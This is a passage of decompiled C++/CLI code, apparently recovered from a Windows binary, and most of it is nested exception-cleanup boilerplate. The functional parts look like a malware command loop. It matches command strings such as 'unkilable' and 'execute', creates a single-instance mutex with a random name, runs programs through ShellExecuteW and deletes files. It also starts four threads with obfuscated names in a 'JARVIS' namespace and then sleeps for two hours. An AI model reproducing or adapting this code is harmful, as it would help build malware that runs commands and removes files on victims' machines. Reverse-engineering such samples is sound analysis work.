            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_81:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar13);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar12);
              }
              \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar12);
              goto label_120;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
label_88:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_09BIBHDFEK\u0040unkilable\u003F\u0024AA\u0040))
              {
                \u003CModule\u003E.Sleep(1000U);
                \u003CModule\u003E.CreateMutexA((_SECURITY_ATTRIBUTES*) 0, 0, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BI\u0040MCELDNJC\u004032123vc1ngk45hjp132s2fd\u003F\u0024AA\u0040);
                if (\u003CModule\u003E.GetLastError() != 183U)
                  goto label_120;
              }
              else
                goto label_99;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_99:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040))
              {
                if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04HKOEJHNN\u0040unk2\u003F\u0024AA\u0040))
                {
                  if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040))
                  {
                    if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar8, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07EMGJIMLB\u0040execute\u003F\u0024AA\u0040))
                    {
                      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar16;
                      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* dirName_in = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar16);
                      bool flag;
                      // ISSUE: fault handler
                      try
                      {
                        flag = !\u003CModule\u003E.llNOzMjObj(dirName_in);
                      }
                      __fault
                      {
                        // ISSUE: method pointer
                        // ISSUE: cast to a function pointer type
                        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar16);
                      }
                      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar16);
                      if (flag)
                      {
                        \u003CModule\u003E.CreateDirectoryW(chPtr, (_SECURITY_ATTRIBUTES*) 0);
                        \u003CModule\u003E.ShellExecuteW((HWND__*) 0, (char*) 0, chPtr, (char*) 0, (char*) 0, 1);
                      }
                      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar17;
                      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar17);
                      // ISSUE: fault handler
                      try
                      {
                        \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr));
                      }
                      __fault
                      {
                        // ISSUE: method pointer
                        // ISSUE: cast to a function pointer type
                        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar17);
                      }
                      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar17);
                      \u003CModule\u003E.remove(ySy);
                    }
                    else
                      goto label_120;
                  }
                  else
                    goto label_120;
                }
                else
                  goto label_120;
              }
              else
                goto label_120;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_120:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              if (!\u003CModule\u003E.rHFG())
                goto label_131;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_131:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.Sleep(2000U);
              \u003CModule\u003E.CreateMutexA((_SECURITY_ATTRIBUTES*) 0, 0, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BI\u0040MCELDNJC\u004032123vc1ngk45hjp132s2fd\u003F\u0024AA\u0040);
              if (\u003CModule\u003E.GetLastError() != 183U)
                goto label_141;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_141:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.Sleep((uint) num5);
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(dkpJDeZMfE), true).start();
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(pqFsKLVFQEhSc), true).start();
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(vwiapKiHaDIc), true).start();
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(hRIjKIzPepMzZhvBJ), true).start();
              \u003CModule\u003E.Sleep(7200000U);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex3) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num7 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
        }
        catch (Exception ex4) when (
        {
          // ISSUE: unable to correctly present filter
          num7 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num7 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_162;
        if (num7 != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num7);
      }
    }
    __fault
    {
      if (num2 == (byte) 0)
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
    }
label_162:
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
    return 0;
  }

